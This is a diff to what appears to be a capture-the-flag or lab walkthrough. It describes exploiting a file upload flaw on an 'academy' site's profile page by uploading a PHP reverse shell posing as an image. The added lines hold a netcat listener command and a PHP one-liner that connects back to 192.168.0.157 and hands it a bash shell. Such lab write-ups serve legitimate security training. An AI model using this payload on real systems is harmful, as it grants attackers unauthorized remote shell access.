@@ -55,7 +55,9 @@ Navigating the websites i found a file upload vulnerability on `/academy/my-prof
 
 We can upload our PHP reverse shell file, Get one from https://www.revshells.com/ , save it in a file with the `.php` extension and upload it as an image file, but before we do that start a netcat listener with `nc -lvnp 1337` , then go ahead with uploading the PHP file 
 
+![](https://i.imgur.com/iS3YC7v.png)
 
+Now paste in your reverse shell payload, i will be using `php -r '$sock=fsockopen("192.168.0.157",1337);exec("/bin/bash <&3 >&3 2>&3");'`  for my payload, after pasting these you should get a connection on your terminal
 
 
 
